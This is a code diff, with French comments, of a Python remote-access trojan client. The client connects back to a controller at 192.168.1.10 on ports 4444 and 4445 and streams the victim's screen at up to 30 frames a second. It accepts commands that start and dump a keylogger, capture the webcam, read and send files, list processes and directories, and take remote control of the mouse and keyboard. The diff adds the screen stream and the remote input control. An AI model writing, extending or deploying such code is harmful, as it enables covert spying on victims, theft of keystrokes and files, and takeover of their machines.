@@ -6,115 +6,116 @@ import pyautogui
 import platform
 import io
 import time
-from protocol import send_data, send_base64
-from modules import keylogger
-from modules import screen_capture
-from modules import file_manager
-from modules import webcam
+import threading
+from protocol import send_data, send_base64, receive_data
+from modules import keylogger, screen_capture, file_manager, webcam
 
 if getattr(sys, 'frozen', False):
-    # PyInstaller : mode exécutable
     os.chdir(sys._MEIPASS)
 
-# Adresse IP du contrôleur
 SERVER_IP = "192.168.1.10"
-PORT = 4444
+PORT = 4444         # Commandes
+PORT_VIDEO = 4445   # Flux vidéo
 
-def connect_to_server():
+def connect_to_server(port):
     while True:
         try:
             s = socket.socket()
-            s.connect((SERVER_IP, PORT))
+            s.connect((SERVER_IP, port))
             return s
         except:
             time.sleep(5)
 
-def capture_screen():
-    screenshot = pyautogui.screenshot()
-    buffer = io.BytesIO()
-    screenshot.save(buffer, format="PNG")
-    return buffer.getvalue()
-
-def list_files():
-    return "\n".join(os.listdir("."))
-
-def list_processes():
-    if platform.system() == "Windows":
-        cmd = "tasklist"
-    else:
-        cmd = "ps aux"
+def stream_screen(s):
     try:
-        return subprocess.check_output(cmd, shell=True).decode()
-    except:
-        return "Erreur d'exécution de la commande"
-
-def shell_command():
-    try:
-        return subprocess.check_output("whoami", shell=True).decode()
-    except:
-        return "Erreur shell"
+        while True:
+            try:
+                img = screen_capture.take_screenshot()
+                print("[client] capture OK - taille:", len(img))
+                send_base64(s, img)
+                time.sleep(1/30)
+            except Exception as e:
+                print("[client] Erreur stream:", e)
+                break
+    except Exception as e:
+        print("[client] Stream crashé :", e)
+    finally:
+        try:
+            s.close()
+        except:
+            pass
 
 def start_client():
-    s = connect_to_server()
+    s_cmd = connect_to_server(PORT)
+    s_video = connect_to_server(PORT_VIDEO)
+
+    threading.Thread(target=stream_screen, args=(s_video,), daemon=True).start()
 
     while True:
         try:
-            command = s.recv(1024).decode()
+            command = s_cmd.recv(1024).decode()
+
             if command == "shell":
-                result = shell_command()
-                send_data(s, result)
+                result = subprocess.getoutput("whoami")
+                send_data(s_cmd, result)
 
             elif command == "screencap":
                 img = screen_capture.take_screenshot()
-                send_base64(s, img)
-
-            elif command == "listfiles":
-                result = list_files()
-                send_data(s, result)
-
-            elif command == "process":
-                result = list_processes()
-                send_data(s, result)
-
-            elif command == "keylogger":
-                send_data(s, "[Keylogger activé (simulation)]")
-
-            elif command == "keylogger_start":
-                keylogger.start_keylogger()
-                send_data(s, "[Keylogger démarré]")
-
-            elif command == "keylogger_dump":
-                logs = keylogger.get_logs()
-                send_data(s, logs if logs else "[Aucune frappe détectée]")
+                send_base64(s_cmd, img)
 
             elif command.startswith("listfiles"):
                 path = command.split(" ", 1)[1] if " " in command else "."
                 result = file_manager.list_directory(path)
-                send_data(s, result)
+                send_data(s_cmd, result)
+
+            elif command == "process":
+                cmd = "tasklist" if platform.system() == "Windows" else "ps aux"
+                result = subprocess.getoutput(cmd)
+                send_data(s_cmd, result)
+
+            elif command.startswith("mouse_move"):
+                try:
+                    _, x, y, w, h = command.split()
+                    screen_w, screen_h = pyautogui.size()
+                    x = int(int(x) * screen_w / int(w))
+                    y = int(int(y) * screen_h / int(h))
+                    pyautogui.moveTo(x, y)
+                except:
+                    pass
+
+            elif command == "click":
+                pyautogui.click()
+
+            elif command.startswith("type"):
+                text = command.split(" ", 1)[1]
+                pyautogui.write(text)
+
+            elif command == "webcam":
+                img = webcam.capture_webcam()
+                send_base64(s_cmd, img if img else b"[Erreur webcam]")
+
+            elif command == "keylogger_start":
+                keylogger.start_keylogger()
+                send_data(s_cmd, "[Keylogger démarré]")
+
+            elif command == "keylogger_dump":
+                logs = keylogger.get_logs()
+                send_data(s_cmd, logs if logs else "[Aucune frappe détectée]")
 
             elif command.startswith("readfile"):
                 path = command.split(" ", 1)[1] if " " in command else ""
                 result = file_manager.read_file(path)
-                send_base64(s, result)
-
-            elif command == "webcam":
-                img = webcam.capture_webcam()
-                if img:
-                    send_base64(s, img)
-                else:
-                    send_data(s, "[Erreur webcam]")
+                send_base64(s_cmd, result)
 
             elif command == "exit":
-                s.close()
+                s_cmd.close()
+                s_video.close()
                 break
+
             else:
-                send_data(s, "Commande inconnue.")
-        except Exception as e:
-            try:
-                send_data(s, f"[Erreur client] {str(e)}")
-            except:
-                pass
-            s = connect_to_server()
+                send_data(s_cmd, "Commande inconnue.")
+        except:
+            s_cmd = connect_to_server(PORT)
 
 if __name__ == "__main__":
     start_client()
